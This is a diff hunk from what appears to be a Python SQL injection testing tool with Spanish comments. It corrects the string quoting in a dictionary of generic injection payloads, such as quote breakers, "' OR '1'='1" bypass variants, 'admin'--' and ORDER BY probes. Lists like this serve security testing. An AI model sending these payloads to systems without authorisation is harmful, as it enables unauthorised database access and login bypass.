@@ -24,9 +24,9 @@ console = Console()
 # Payloads para diferentes técnicas
 PAYLOADS = {
     "generic": [
-        "'", '"', "'", "''", "\"\"', "` ",
+        "'", '"', "'", "''", '""', "` ",
         "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
-        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
+        '" OR "1"="1', '" OR "1"="1"--',
         "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
         "admin'--", "admin'#", "') OR ('1'='1",
         "1' ORDER BY 1--", "1' ORDER BY 10--",
